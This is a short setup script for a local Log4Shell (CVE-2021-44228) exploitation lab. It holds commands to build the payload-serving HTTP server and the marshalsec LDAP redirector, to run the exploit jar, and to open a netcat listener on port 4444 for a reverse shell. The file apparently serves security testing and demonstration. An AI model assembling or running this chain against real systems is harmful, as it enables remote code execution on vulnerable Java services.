# Commands to setup
cd CVE-2021-44228-Apache-Log4j-Rce/
javac Exploit.java
mvn clean package
docker build -t server . # Build python server docker image
cd ../marshalsec/
docker build -t japp . # Build ldap server docker image
cd ..

# Command to start python http server
#   docker run --rm -it --name server -p 8888:8888 server
# Test
#   curl -I 127.0.0.1:8888/Exploit.class

# Command to run ldap server
#   docker run --rm -it --name japp -p 1389:1389 japp

# Command to run exploit
# 	java -cp target/log4j-rce-1.0-SNAPSHOT-all.jar log4j

# Command to start listener
#   nc -nlvp 4444

# Dependencies
# 	docker
# 	maven
# 	python3
# 	openjdk
# 	semgrep
# 	grype
